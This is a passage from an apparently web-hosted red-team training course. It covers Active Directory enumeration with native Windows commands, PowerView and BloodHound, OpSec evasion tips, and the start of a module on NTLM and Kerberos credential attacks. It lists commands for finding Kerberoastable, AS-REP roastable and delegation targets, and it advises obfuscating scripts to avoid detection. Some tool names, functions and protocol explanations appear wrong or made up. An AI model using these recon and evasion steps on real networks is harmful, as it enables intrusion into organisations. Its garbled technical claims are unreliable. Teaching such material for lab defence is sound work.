forest trust each other transitively by default.</li>\n<li><strong>Trusts:</strong> Relationships between domains or forests that allow users in one domain to access resources in another. Can be transitive (flows through) or non-transitive, one-way or two-way. A trust is a potential lateral movement path <em>across</em> domain boundaries.</li>\n<li><strong>Organizational Units (OUs):</strong> Containers within a domain used to organize users, groups, computers, and other OUs. OUs are key for applying Group Policy.</li>\n<li><strong>Group Policy Objects (GPOs):</strong> Collections of settings that control the working environment of user and computer accounts. Applied to Sites, Domains, or OUs. GPOs are powerful for enforcing security, but misconfigured GPOs (e.g., containing credentials, applying insecure settings) can be a major weakness.</li>\n<li><strong>Users &amp; Groups:</strong> The principals and collections of principals within the domain. We&#39;re particularly interested in privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, etc.) and users who are members of these groups, or users with specific attributes that make them vulnerable (e.g., SPNs, weak passwords, &#39;Do not require Kerberos preauthentication&#39;).</li>\n<li><strong>Computers:</strong> Workstations and servers joined to the domain. Computers also have accounts in AD. Their local group memberships (especially local Administrators) and authenticated sessions are critical for lateral movement.</li>\n</ul>\n<p><strong>Red Team Focus:</strong> We&#39;re looking for <em>relationships</em> and <em>misconfigurations</em>. Who is a local admin on which machine? Which users are in which privileged groups? Which computers have which users logged in? Which GPOs apply where and contain what? Where do trusts exist? These connections form the graph we want to exploit.</p>\n<hr>\n<h3><strong>5.2 Native Command-Line Tools for AD Enumeration</strong></h3>\n<p>Why start with native tools? Because they are <em>always</em> there on a Windows machine (unless heavily crippled), they don&#39;t require bringing external executables (potentially triggering AV/EDR), and they are often less suspicious than powerful PowerShell scripts or dedicated tools if used carefully. They can be slow and noisy for large domains, but they are fundamental.</p>\n<p>Make sure you execute these commands from a domain-joined machine, ideally with credentials that have at least standard domain user privileges.</p>\n<p><strong>Essential Native Commands:</strong></p>\n<ol>\n<li><p><strong>Identifying the Domain and Domain Controller:</strong></p>\n<ul>\n<li><code>systeminfo | findstr /B /C:&quot;Domain:&quot; /C:&quot;Logon Server:&quot;</code><ul>\n<li>Finds the joined domain and the DC used for login.</li>\n</ul>\n</li>\n<li><code>ipconfig /all | findstr &quot;Primary Dns Suffix&quot;</code><ul>\n<li>Another way to find the domain name.</li>\n</ul>\n</li>\n<li><code>nltest /domain_trusts</code><ul>\n<li>Lists domain trusts (if any) for the current domain. Requires elevated privileges sometimes.</li>\n</ul>\n</li>\n<li><code>nltest /dclist:&lt;DomainName&gt;</code><ul>\n<li>Lists domain controllers for a specific domain.</li>\n<li><em>Example:</em> <code>nltest /dclist:corp.local</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating Domain Users:</strong></p>\n<ul>\n<li><code>net user /domain</code><ul>\n<li>Lists all user accounts in the domain. Basic, but effective.</li>\n</ul>\n</li>\n<li><code>dsquery user -limit 0</code><ul>\n<li>More flexible. <code>-limit 0</code> means no limit (get all users).</li>\n<li><em>Example:</em> <code>dsquery user -limit 0 | more</code> (pipe to <code>more</code> if list is long)</li>\n</ul>\n</li>\n<li><code>dsquery user -name &quot;Admin*&quot;</code><ul>\n<li>Finds users whose name starts with &quot;Admin&quot;.</li>\n</ul>\n</li>\n<li><code>dsget user &lt;UserDN&gt; -display -memberof</code><ul>\n<li>Gets details about a specific user and their group memberships. You&#39;d need the Distinguished Name (DN) from <code>dsquery</code>.</li>\n<li><em>Example:</em> <code>dsquery user -samid &quot;johndoe&quot; | dsget user -display -memberof</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating Domain Groups:</strong></p>\n<ul>\n<li><code>net group /domain</code><ul>\n<li>Lists all global and domain local groups in the domain.</li>\n</ul>\n</li>\n<li><code>net group &quot;&lt;GroupName&gt;&quot; /domain</code><ul>\n<li>Lists members of a specific domain group. Very useful for finding members of privileged groups.</li>\n<li><em>Example:</em> <code>net group &quot;Domain Admins&quot; /domain</code></li>\n<li><em>Example:</em> <code>net group &quot;Enterprise Admins&quot; /domain</code></li>\n<li><em>Example:</em> <code>net group &quot;Administrators&quot; /domain</code> (This lists members of the <em>built-in</em> Administrators group in the domain, often containing Domain Admins)</li>\n</ul>\n</li>\n<li><code>dsquery group -limit 0</code><ul>\n<li>Lists all groups in the domain. More options for filtering than <code>net group</code>.</li>\n</ul>\n</li>\n<li><code>dsget group &lt;GroupDN&gt; -members</code><ul>\n<li>Lists members of a group using its DN.</li>\n<li><em>Example:</em> <code>dsquery group -name &quot;Domain Admins&quot; | dsget group -members</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating Domain Computers:</strong></p>\n<ul>\n<li><code>net view /domain:&lt;DomainName&gt;</code><ul>\n<li>Lists computers (servers and workstations) visible in the domain.</li>\n<li><em>Example:</em> <code>net view /domain:corp.local</code></li>\n</ul>\n</li>\n<li><code>dsquery computer -limit 0</code><ul>\n<li>Lists all computer accounts in the domain.</li>\n<li><em>Example:</em> <code>dsquery computer -limit 0</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating OUs:</strong></p>\n<ul>\n<li><code>dsquery ou -limit 0</code><ul>\n<li>Lists all Organizational Units. Useful for understanding the domain&#39;s structure.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><strong>Pros of Native Tools:</strong></p>\n<ul>\n<li>Always available.</li>\n<li>Low risk of detection <em>by signature</em> (though command line logging can catch them).</li>\n<li>Good for quick checks if you know exactly what you&#39;re looking for.</li>\n</ul>\n<p><strong>Cons of Native Tools:</strong></p>\n<ul>\n<li>Limited functionality compared to PowerShell or dedicated tools.</li>\n<li>Output is often messy and difficult to parse programmatically.</li>\n<li>Can be very slow for large domains.</li>\n<li>Often requires specific syntax and DNs (<code>dsquery</code>/<code>dsget</code>).</li>\n</ul>\n<hr>\n<h3><strong>5.3 Advanced AD Enumeration with PowerShell</strong></h3>\n<p>PowerShell is your best friend for AD reconnaissance. It&#39;s flexible, powerful, and its output is structured, making it easy to filter, sort, and export data. The <code>ActiveDirectory</code> module (part of the Remote Server Administration Tools - RSAT) provides cmdlets specifically designed for interacting with AD. Even without RSAT installed, modules like <code>PowerView</code> can often perform similar actions by directly interacting with the LDAP protocol.</p>\n<p><strong>Using the <code>ActiveDirectory</code> Module:</strong></p>\n<p>If RSAT is installed (often on administrative workstations or servers), you can import the module:</p>\n<pre><code class=\"language-powershell\">Import-Module ActiveDirectory\n</code></pre>\n<p>Now you have access to cmdlets like <code>Get-ADUser</code>, <code>Get-ADGroup</code>, <code>Get-ADComputer</code>, <code>Get-ADDomain</code>, <code>Get-ADForest</code>, <code>Get-ADOrganizationalUnit</code>, <code>Get-ADServicePrincipalName</code>, etc.</p>\n<p><strong>Examples with <code>ActiveDirectory</code> Module:</strong></p>\n<pre><code class=\"language-powershell\"># Get information about the domain\nGet-ADDomain\n\n# Get information about the forest\nGet-ADForest\n\n# List all users (first 10 for brevity, remove -ResultSetSize for all)\nGet-ADUser -Filter * -Properties SamAccountName -ResultSetSize 10 | Select-Object SamAccountName\n\n# Get details for a specific user\nGet-ADUser -Identity &quot;johndoe&quot; -Properties * # Use -Properties * to get all attributes\n\n# List all groups\nGet-ADGroup -Filter * | Select-Object Name\n\n# Get members of the &quot;Domain Admins&quot; group\nGet-ADGroupMember -Identity &quot;Domain Admins&quot;\n\n# List all computers\nGet-ADComputer -Filter * | Select-Object Name, OperatingSystem\n\n# Find computers where a specific user is a local administrator (requires checking local groups, more complex with just this module)\n# This requires iterating or using other techniques, PowerView simplifies this!\n\n# Find users whose password hasn&#39;t expired (potential service accounts)\nGet-ADUser -Filter &#39;PasswordExpired -eq $false&#39; -Properties SamAccountName, PasswordNeverExpires\n\n# Find users with &#39;Do not require Kerberos preauthentication&#39; enabled (AS-REP Roasting target)\nGet-ADUser -Filter &#39;UserAccountControl -band 0x400000&#39; -Properties SamAccountName, UserPrincipalName\n\n# Find Service Principal Names (SPNs) - Kerberoasting targets\nGet-ADServicePrincipalName -Filter *\n# Or more specifically, users/computers with SPNs\nGet-ADUser -Filter &#39;ServicePrincipalNames -like &quot;*&quot;&#39; -Properties SamAccountName, ServicePrincipalNames\nGet-ADComputer -Filter &#39;ServicePrincipalNames -like &quot;*&quot;&#39; -Properties Name, ServicePrincipalNames\n</code></pre>\n<p><strong>Using <code>PowerView</code> (from PowerSploit/Deviance):</strong></p>\n<p><code>PowerView</code> is a PowerShell script designed specifically for AD reconnaissance from an offensive perspective. It&#39;s often preferred because it consolidates many useful functions and can sometimes bypass execution restrictions more easily than importing a formal module.</p>\n<p>First, you need to get the <code>PowerView.ps1</code> script. You can often find it in red teaming frameworks (like Covenant, Empire, or standalone on GitHub).</p>\n<pre><code class=\"language-powershell\"># Assuming you&#39;ve downloaded PowerView.ps1 to the current directory\nImport-Module .\\PowerView.ps1 -Force # Use -Force if it was previously imported\n</code></pre>\n<p>Now you have access to functions like <code>Get-NetDomain</code>, <code>Get-NetUser</code>, <code>Get-NetGroup</code>, <code>Get-NetComputer</code>, <code>Get-NetGPO</code>, <code>Get-NetForestTrust</code>, <code>Find-LocalAdminAccess</code>, <code>Invoke-UserHunter</code>, <code>Invoke-ShareFinder</code>, etc.</p>\n<p><strong>Examples with <code>PowerView</code>:</strong></p>\n<pre><code class=\"language-powershell\"># Get domain information\nGet-NetDomain\n\n# Get information about the domain controller\nGet-NetDomainController\n\n# List all domain users\nGet-NetUser\n\n# Get specific user details (including potentially useful attributes)\nGet-NetUser -UserName &quot;johndoe&quot; -Properties * # PowerView often gets more attributes by default\n\n# List all domain groups\nGet-NetGroup\n\n# Get members of a specific group\nGet-NetGroupMember -GroupName &quot;Domain Admins&quot;\n\n# Find all computers\nGet-NetComputer\n\n# Find computers where a specific user is a local administrator\nFind-LocalAdminAccess -UserName &quot;johndoe&quot; # Check where &#39;johndoe&#39; has local admin rights\n\n# Find all users logged into domain computers (requires admin rights on target machines)\nInvoke-UserHunter\n\n# Find shares on domain computers\nInvoke-ShareFinder\n\n# List domain trusts\nGet-NetForestTrust\n\n# Find GPOs and their links\nGet-NetGPO\nGet-NetGPO -ComputerName &lt;ComputerName&gt; # Get GPOs applied to a specific computer\nGet-NetGPO -UserName &lt;UserName&gt; # Get GPOs applied to a specific user\n\n# Find users with SPNs (Kerberoasting targets!)\nGet-NetUser -SPN\n\n# Find users with &#39;Do not require Kerberos preauthentication&#39; (AS-REP Roasting targets!)\nGet-NetUser -PreauthNotRequired\n\n# Find Kerberoastable users and output in crackable format (requires admin or specific privileges sometimes)\nGet-NetUser -SPN | Select-Object samaccountname, serviceprincipalname | Format-Table -AutoSize\n# For extraction, tools like Rubeus or Mimikatz are better (covered in M6)\n\n# Find computers/users with unconstrained delegation configured\nGet-NetDelegateStatus -Unconstrained\n\n# Find potential paths to Domain Admins (PowerView can do basic pathfinding, but BloodHound is superior)\nFind-DomainProcess -GroupName &quot;Domain Admins&quot; # Find processes run by DA members\nFind-DomainShare -GroupName &quot;Domain Admins&quot; # Find shares accessible by DA members\nFind-DomainController\n</code></pre>\n<p><strong>Pros of PowerShell/PowerView:</strong></p>\n<ul>\n<li>Much more flexible and powerful than native tools.</li>\n<li>Output is object-based, easy to filter, sort, and export.</li>\n<li><code>PowerView</code> is designed for offensive recon and covers many common AD enumeration tasks efficiently.</li>\n<li>Leverages the .NET framework, often available on the system.</li>\n</ul>\n<p><strong>Cons of PowerShell/PowerView:</strong></p>\n<ul>\n<li>Requires PowerShell execution policies to allow script execution (can often be bypassed).</li>\n<li>Can generate more suspicious logs than native tools.</li>\n<li>Requires getting the script onto the target machine (though fileless execution is possible).</li>\n</ul>\n<p><strong>Pro Tip:</strong> When doing extensive enumeration, save your results! Export to CSV or JSON for later analysis:<br><code>Get-NetUser | Export-Csv -Path C:\\Temp\\domain_users.csv -NoTypeInformation</code></p>\n<hr>\n<h3><strong>5.4 Why Attack Path Mapping? Introducing BloodHound</strong></h3>\n<p>You&#39;ve run your commands, collected lists of users, groups, computers, and GPOs. You might even have some initial findings like &quot;User &#39;backup_admin&#39; is a member of &#39;Backup Operators&#39;&quot; or &quot;Computer &#39;SERVER01&#39; has a lot of shares.&quot;</p>\n<p>But how does this <em>connect</em>? How does knowing &#39;backup_admin&#39; is in &#39;Backup Operators&#39; help you get to &#39;Domain Admins&#39;? Is &#39;backup_admin&#39; a local admin on &#39;SERVER01&#39;? Is a Domain Admin logged into &#39;SERVER01&#39;? What if &#39;backup_admin&#39; has a session on a workstation where a Domain Admin <em>also</em> has a session?</p>\n<p>Active Directory is a graph of relationships. Users are members of groups. Groups have permissions on resources. Users log into computers. Users are local administrators on computers. Users have control over OUs or GPOs. These relationships are complex and form potential <em>attack paths</em>.</p>\n<p>Manually tracing these relationships across thousands of objects is nearly impossible. This is where <strong>BloodHound</strong> comes in.</p>\n<p><strong>BloodHound</strong> is an open-source tool designed to reveal the hidden and often unintended relationships within an Active Directory environment. It uses graph theory to map these connections and identify highly complex attack paths that might otherwise go unnoticed.</p>\n<p><strong>BloodHound Components:</strong></p>\n<ol>\n<li><strong>Collector:</strong> Gathers data from the AD environment. The primary collectors are <strong>SharpHound</strong> (C#) and <strong>PowerHound</strong> (PowerShell). You run this on a compromised host within the domain.</li>\n<li><strong>Database:</strong> Stores the collected data in a graph format. BloodHound uses <strong>Neo4j</strong>, a popular graph database.</li>\n<li><strong>GUI:</strong> A graphical interface to interact with the database, visualize the relationships, and run built-in or custom queries to find attack paths.</li>\n</ol>\n<p><strong>The Power of the Graph:</strong></p>\n<p>BloodHound sees AD objects (Users, Groups, Computers, GPOs, OUs, Trusts) as <em>nodes</em> and the relationships between them (MemberOf, AdminTo, Session, HasSession, GenericAll, WriteDacl, etc.) as <em>edges</em>. By analyzing these edges, it can find paths like:</p>\n<ul>\n<li>User A -&gt; MemberOf -&gt; Group X -&gt; AdminTo -&gt; Computer Y -&gt; HasSession -&gt; User B -&gt; MemberOf -&gt; Domain Admins</li>\n<li>User C -&gt; WriteDacl -&gt; GPO Z -&gt; LinksTo -&gt; OU -&gt; Contains -&gt; Computer W -&gt; LocalAdmin -&gt; User D -&gt; Kerberoastable -&gt; (Crack Hash) -&gt; Access Service on DC -&gt; DCSync -&gt; Domain Admins</li>\n</ul>\n<p>This is the core concept: chaining seemingly unrelated permissions and relationships to find a path to a high-value target.</p>\n<hr>\n<h3><strong>5.5 Using BloodHound: Collection, Database, and GUI</strong></h3>\n<p>Let&#39;s walk through the practical steps of using BloodHound.</p>\n<p><strong>Step 1: Obtain a Collector (SharpHound Recommended)</strong></p>\n<ul>\n<li>Go to the BloodHound GitHub repository (or search for &quot;BloodHound GitHub&quot;).</li>\n<li>Find the releases page. Download the latest <code>SharpHound.exe</code> or <code>SharpHound.zip</code>.</li>\n<li>Transfer <code>SharpHound.exe</code> to your compromised domain-joined host in the lab environment. Place it in a directory you can execute from (e.g., <code>C:\\Temp</code>).</li>\n</ul>\n<p><strong>Step 2: Run the Collector</strong></p>\n<p>Execute <code>SharpHound.exe</code> from a command prompt or PowerShell window on the target host.</p>\n<pre><code class=\"language-cmd\">C:\\Temp\\SharpHound.exe --collectionmethod All\n</code></pre>\n<ul>\n<li><code>--collectionmethod All</code>: This is the most comprehensive collection method. It gathers users, groups, computers, sessions, local admins, ACLs, GPOs, and trusts. In a real engagement, you might start with less noisy methods (<code>Default</code>) and escalate if needed.</li>\n<li>You can specify a domain if the tool doesn&#39;t detect it correctly: <code>--domain your.domain.local</code></li>\n<li><code>SharpHound</code> will output a <code>.json</code> or <code>.zip</code> file (depending on version/flags) in the same directory it was run from. This file contains the collected data.</li>\n</ul>\n<p><strong>Pro Tip:</strong> Running <code>SharpHound</code> with a low-privileged user will still gather significant data (users, groups, computers, trusts, basic session info visible via LDAP). Running it with a user that has local administrator rights on multiple machines or domain query privileges will collect much richer data, especially regarding sessions and local admin rights. Running it as a Domain Admin yields the most complete picture.</p>\n<p><strong>Step 3: Set up the Database (Neo4j)</strong></p>\n<ul>\n<li>Download Neo4j Desktop from the official Neo4j website.</li>\n<li>Install Neo4j Desktop on your attacker machine (your Kali VM, Windows analysis VM, etc.).</li>\n<li>Launch Neo4j Desktop.</li>\n<li>Click &quot;Add Graph&quot; -&gt; &quot;Create a Local Graph&quot;.</li>\n<li>Give it a name (e.g., &quot;MyADLab&quot;).</li>\n<li>Set a password (remember this!).</li>\n<li>Click &quot;Create&quot;.</li>\n<li>Once created, click the &quot;Start&quot; button next to your graph instance. Note the bolt address (usually <code>bolt://localhost:7687</code>).</li>\n</ul>\n<p><strong>Step 4: Launch the BloodHound GUI</strong></p>\n<ul>\n<li>Download the BloodHound GUI from the BloodHound GitHub releases page.</li>\n<li>Extract the BloodHound GUI files.</li>\n<li>Run the BloodHound executable (e.g., <code>BloodHound.exe</code> on Windows, <code>bloodhound</code> on Linux if installed via package manager or running from source).</li>\n</ul>\n<p><strong>Step 5: Connect to the Database and Import Data</strong></p>\n<ul>\n<li><p>When BloodHound GUI opens, it will prompt for connection details.</p>\n</li>\n<li><p><strong>Database Type:</strong> Neo4j</p>\n</li>\n<li><p><strong>Database URI:</strong> <code>bolt://localhost:7687</code> (or whatever Neo4j Desktop shows)</p>\n</li>\n<li><p><strong>Database Username:</strong> <code>neo4j</code></p>\n</li>\n<li><p><strong>Database Password:</strong> The password you set in Step 3.</p>\n</li>\n<li><p>Click &quot;Connect&quot;.</p>\n</li>\n<li><p>Once connected, click the &quot;Upload Data&quot; icon (up arrow) in the toolbar.</p>\n</li>\n<li><p>Browse to the <code>.json</code> or <code>.zip</code> file generated by <code>SharpHound</code> on your target host and transfered back to your attacker machine.</p>\n</li>\n<li><p>Select the file and click &quot;Open&quot;.</p>\n</li>\n<li><p>BloodHound will import the data. This might take some time depending on the size of the AD environment. Watch the status bar at the bottom.</p>\n</li>\n</ul>\n<p><strong>Step 6: Querying and Analyzing the Graph</strong></p>\n<p>Once the import is complete, you&#39;ll see statistics about the number of users, computers, groups, etc. Now the real fun begins!</p>\n<p>BloodHound has a search bar and a list of built-in queries in the left-hand pane. Let&#39;s explore the essential ones mentioned in the outline:</p>\n<ul>\n<li><p><strong>Shortest Path to Domain Admins:</strong></p>\n<ul>\n<li>Find this query in the &quot;Shortest Paths&quot; section.</li>\n<li>Click it. BloodHound will calculate and display the shortest path(s) from <em>any</em> node you own (or could potentially compromise) to the &quot;Domain Admins&quot; group.</li>\n<li><em>Interpretation:</em> This shows you the most direct routes. Each arrow represents a relationship (e.g., <code>AdminTo</code>, <code>MemberOf</code>, <code>HasSession</code>). Follow the path: &quot;If I compromise [Node A], I can get to [Node B] because of [Relationship], and from [Node B] I can get to [Node C] because of [Relationship], until I reach &#39;Domain Admins&#39;&quot;. This is your primary attack vector map!</li>\n</ul>\n</li>\n<li><p><strong>Kerberoastable Users:</strong></p>\n<ul>\n<li>Find this query in the &quot;Pre-built Queries&quot; section (or search for &quot;Kerberoastable&quot;).</li>\n<li>Click it. This query finds user accounts that have a Service Principal Name (SPN) registered and the account password is not set to &quot;Password Never Expires&quot;. These are ideal targets for the Kerberoasting attack (covered in Module 6).</li>\n<li><em>Interpretation:</em> These are user accounts (often service accounts) whose NTLM hash is used to encrypt their Kerberos service ticket. If you can request a ticket for their SPN, you get an encrypted blob that can be cracked offline <em>without</em> interacting further with the user or domain controller after the initial ticket request.</li>\n</ul>\n</li>\n<li><p><strong>AS-REP Roastable Users:</strong></p>\n<ul>\n<li>Find this query in the &quot;Pre-built Queries&quot; section (or search for &quot;AS-REP&quot;).</li>\n<li>Click it. This query finds user accounts where the &#39;Do not require Kerberos preauthentication&#39; flag is set.</li>\n<li><em>Interpretation:</em> These accounts don&#39;t perform the initial Kerberos preauthentication step (which uses a timestamp encrypted with the user&#39;s password hash). This means you can send an AS-REQ packet requesting a TGT for this user, and the KDC will return the user&#39;s TGT encrypted with their NTLM hash, without needing to know their password or perform the secure timestamp exchange. You can then crack this hash offline (covered in Module 6).</li>\n</ul>\n</li>\n<li><p><strong>Unconstrained Delegation:</strong></p>\n<ul>\n<li>Find this query in the &quot;Pre-built Queries&quot; section (or search for &quot;Unconstrained Delegation&quot;).</li>\n<li>Click it. This query finds computers or users configured for unconstrained Kerberos delegation.</li>\n<li><em>Interpretation:</em> If you compromise a computer or user with unconstrained delegation enabled, and a high-privileged user (like a Domain Admin) authenticates to that compromised principal, the compromised principal receives a forwardable TGT for the high-privileged user. This TGT can then be reused to authenticate as the high-privileged user elsewhere in the domain. This is a <em>very</em> powerful primitive if you can find and exploit it.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Exploring Other Queries:</strong></p>\n<ul>\n<li>Browse the &quot;Pre-built Queries&quot; for others like &quot;AdminTo&quot;, &quot;CanRDP&quot;, &quot;CanPSRemote&quot;, &quot;Contains&quot; (for OUs), etc.</li>\n<li>Use the search bar to find specific users, computers, or groups. Right-click on a node to explore its relationships (&quot;Get All Paths To/From Here&quot;).</li>\n<li>Learn the Cypher query language (Neo4j&#39;s query language) to write your own custom queries for specific scenarios or relationships.</li>\n</ul>\n<hr>\n<h3><strong>5.6 OpSec Considerations for AD Enumeration</strong></h3>\n<p>While essential, AD enumeration isn&#39;t silent. Be mindful of the noise you&#39;re creating:</p>\n<ul>\n<li><strong>Native Tools (<code>net</code>, <code>dsquery</code>, <code>nltest</code>):</strong> These execute standard Windows binaries. Their activity might appear in command-line logging or process creation logs. <code>nltest</code> queries specifically talk to Domain Controllers and can be logged there.</li>\n<li><strong>PowerShell (<code>Get-AD*</code>, <code>PowerView</code>):</strong> PowerShell activity is heavily logged if ScriptBlock Logging and Module Logging are enabled (which they should be in well-defended networks). <code>PowerView</code> functions often make direct LDAP queries, which can be monitored on Domain Controllers.</li>\n<li><strong>SharpHound:</strong> This tool makes a large number of LDAP and MSRPC (for sessions/local admins) queries to Domain Controllers and potentially other machines. This can be detected by monitoring tools looking for unusual query volumes or patterns from a single host. Transferring the <code>SharpHound.exe</code> executable itself can also be detected by AV/EDR. Transferring the large output <code>.json</code>/<code>.zip</code> file back to your machine is another potential detection point.</li>\n</ul>\n<p><strong>Mitigation:</strong></p>\n<ul>\n<li>Use credentials appropriate for the level of access you need.</li>\n<li>Understand the logging capabilities of the target environment.</li>\n<li>Consider using less noisy collection methods in SharpHound initially (<code>Default</code> often relies more on LDAP, which might be less monitored than MSRPC or session enumeration in some environments).</li>\n<li>Perform collection during times of high network activity if stealth is paramount (though this is never guaranteed).</li>\n<li>Use obfuscation for PowerShell scripts if necessary.</li>\n<li>Be prepared for detection and have a plan.</li>\n</ul>\n<hr>\n<h3><strong>Module 5 Summary</strong></h3>\n<p>We&#39;ve covered a massive amount of ground! We started by revisiting core AD concepts from an attacker&#39;s viewpoint. We learned how to use built-in Windows commands to gather basic AD information. We then stepped up our game with PowerShell, leveraging the <code>ActiveDirectory</code> module and the powerful <code>PowerView</code> functions for more detailed and flexible</p>\n\n                </div>\n             </div>\n         ",
    "module-6": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 6: module_6</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome back! We&#39;ve navigated the initial host, dug deep into local enumeration and PE, and even started moving around the network. Now, we arrive at a goldmine for attackers: <strong>credentials</strong>.</p>\n<p>Module 6 is where we elevate our understanding of authentication and learn how to leverage harvested credentials, hashes, and tickets in sophisticated ways to unlock further access and pave the way to domain dominance. This is where the real power plays begin!</p>\n<p>As always, everything we discuss is for ethical red teaming and security testing <em>within your own lab environment</em>. Understanding these techniques is crucial for building robust defenses. Let&#39;s dive in!</p>\n<hr>\n<h2><strong>Module 6: Advanced Credential Attacks</strong></h2>\n<h3><strong>Module Objective:</strong></h3>\n<p>Deepen your understanding of NTLM and Kerberos authentication and execute sophisticated credential-based attacks to obtain hashes, tickets, and gain access to resources within an Active Directory environment.</p>\n<h3><strong>Essential Subtopics:</strong></h3>\n<ol>\n<li>In-depth look at NTLM authentication (challenges, responses, hash formats).</li>\n<li>Pass-the-Hash (PtH) techniques and tools.</li>\n<li>Understanding Kerberos authentication (TGT, TGS, SPNs).</li>\n<li>Pass-the-Ticket (PtT) techniques.</li>\n<li>Overpass-the-Hash (PtT using NTLM hash to request a TGT).</li>\n<li>Kerberoasting: Identifying Service Principal Names (SPNs), requesting service tickets, and offline cracking.</li>\n<li>AS-REP Roasting: Identifying users with &#39;Do not require Kerberos preauthentication&#39; and requesting their initial authentication hash.</li>\n<li>Leveraging tools like Mimikatz, Rubeus, Impacket.</li>\n<li>Defenses and detection methods for these attacks.</li>\n<li>Case Study: How credential attacks are used in major breaches.</li>\n</ol>\n<hr>\n<h3><strong>6.1 Authentication Deep Dive (Relevant to Attacks)</strong></h3>\n<p>Before we can exploit authentication mechanisms, we need a slightly deeper understanding of how they <em>actually work</em> in a Windows and Active Directory context. We&#39;ll focus on the aspects critical for the attacks we&#39;re about to learn.</p>\n<h4><strong>6.1.1 NTLM Authentication</strong></h4>\n<p>NTLM (NT LAN Manager) is an older authentication protocol but is still widely used, especially for local authentication and in scenarios where Kerberos isn&#39;t available or configured. It&#39;s a challenge/response protocol.</p>\n<ul>\n<li><p><strong>The Flow (Simplified):</strong></p>\n<ol>\n<li>Client sends a negotiation message to the server.</li>\n<li>Server sends back a challenge (a random nonce).</li>\n<li>Client encrypts the challenge using the <em>hash</em> of the user&#39;s password and sends the encrypted challenge back as the response.</li>\n<li>Server (or a Domain Controller it trusts) retrieves the user&#39;s password hash, encrypts the original challenge with it, and compares the result to the client&#39;s response.</li>\n<li>If they match, authentication succeeds.</li>\n</ol>\n</li>\n<li><p><strong>Why Pass-the-Hash Works:</strong> Notice step 3. The client <em>never</em> sends the actual password. It only needs the <em>hash</em> of the password to calculate the correct response to the server&#39;s challenge. If an attacker obtains this hash, they can perform the same calculation and authenticate as the user <em>without ever knowing the original password</em>. This is the fundamental principle behind Pass-the-Hash.</p>\n</li>\n<li><p><strong>NTLM Hashes:</strong> The hash used is typically the NTLM hash (MD4 of the UTF-16 representation of the password). Tools like Mimikatz often dump this hash directly from memory (LSASS). You&#39;ll commonly see them represented as 32 hexadecimal characters.</p>\n<ul>\n<li>Example: <code>518b05f361ad763729324a0189a73422</code> (This is <em>not</em> a real hash, just format example).</li>\n</ul>\n</li>\n</ul>\n<h4><strong>6.1.2 Kerberos Authentication</strong></h4>\n<p>Kerberos is the <em>default</em> and preferred authentication protocol in Active Directory domains. It&#39;s more secure than NTLM (when configured correctly) and relies on a trusted third party, the Key Distribution Center (KDC), which is typically a Domain Controller (DC). Kerberos uses &quot;tickets&quot; to grant access.</p>\n<ul>\n<li><p><strong>Key Components:</strong></p>\n<ul>\n<li><strong>Client:</strong> The user or service requesting access.</li>\n<li><strong>Server:</strong> The resource or service the client wants to access.</li>\n<li><strong>KDC (Key Distribution Center):</strong> Consists of two parts:<ul>\n<li><strong>AS (Authentication Service):</strong> Issues Ticket Granting Tickets (TGTs).</li>\n<li><strong>TGS (Ticket Granting Service):</strong> Issues Service Tickets (TGSs).</li>\n</ul>\n</li>\n<li><strong>Principal:</strong> An entity that can be authenticated (user, computer, service). Each principal has a secret key (derived from their password/machine account password).</li>\n<li><strong>Realms:</strong> Kerberos domains (in AD, the domain name is the realm).</li>\n</ul>\n</li>\n<li><p><strong>The Flow (Simplified - Requesting a Service Ticket):</strong></p>\n<ol>\n<li><strong>AS-REQ (Authentication Service Request):</strong> Client sends its username to the AS, requesting a TGT. The request is encrypted with the client&#39;s secret key (password hash).</li>\n<li><strong>AS-REP (Authentication Service Reply):</strong> AS verifies the client&#39;s identity. If valid, it generates a TGT. The TGT contains information about the client and is encrypted with the KDC&#39;s secret key (the <code>krbtgt</code> account hash). The AS sends this TGT back to the client, encrypted with the client&#39;s secret key. <em>The client can now decrypt the outer layer to get the TGT, but cannot read the contents inside (encrypted with <code>krbtgt</code> hash).</em></li>\n<li><strong>TGS-REQ (Ticket Granting Service Request):</strong> When the client wants to access a specific service (e.g., a file share on a server), it sends the TGT (obtained in step 2) to the TGS, requesting a Service Ticket for that service&#39;s Principal (identified by its SPN).</li>\n<li><strong>TGS-REP (Ticket Granting Service Reply):</strong> TGS verifies the TGT (using its <code>krbtgt</code> key). If valid, it generates a Service Ticket for the requested service. This Service Ticket is encrypted with the <em>service principal&#39;s</em> secret key (the hash of the user account or computer account the SPN is associated with). The TGS sends this Service Ticket back to the client, encrypted with a session key shared between the client and TGS (which was included inside the TGT).</li>\n<li><strong>AP-REQ (Application Request):</strong> Client sends the Service Ticket (obtained in step 4) to the target Server/Service.</li>\n<li><strong>AP-REP (Application Reply):</strong> Server receives the Service Ticket, decrypts it using its own secret key (the service principal&#39;s hash). If successful, it verifies the client&#39;s identity and grants access.</li>\n</ol>\n</li>\n<li><p><strong>Why Pass-the-Ticket Works:</strong> If an attacker obtains a valid TGT or TGS ticket (e.g., by dumping the credential cache from LSASS), they can inject it into their own session. The operating system&#39;s Kerberos implementation will then present this ticket when attempting to access resources, allowing the attacker to authenticate as the user the ticket belongs to, <em>without knowing the password or hash</em>.</p>\n</li>\n<li><p><strong>Why Kerberoasting Works:</strong> Look at step 4. The Service Ticket is encrypted with the <em>service principal&#39;s secret key</em> (their NTLM hash). If a service principal is associated with a <em>user</em> account (common for custom applications, SQL services, etc.), and an attacker can obtain that service ticket (which any authenticated domain user can request for <em>any</em> SPN), they can attempt to decrypt the ticket offline using the service account&#39;s hash. This is a direct path to obtaining the service account&#39;s NTLM hash for offline cracking.</p>\n</li>\n<li><p><strong>Why AS-REP Roasting Works:</strong> Look at step 1. The AS-REQ is normally encrypted with the user&#39;s secret key (hash). However, if the &#39;Do not require Kerberos preauthentication&#39; flag is set for a user, the initial AS-REQ is sent <em>without</em> this encryption step. The AS-REP returned contains a timestamp encrypted with the user&#39;s hash. An attacker capturing this exchange can extract the encrypted 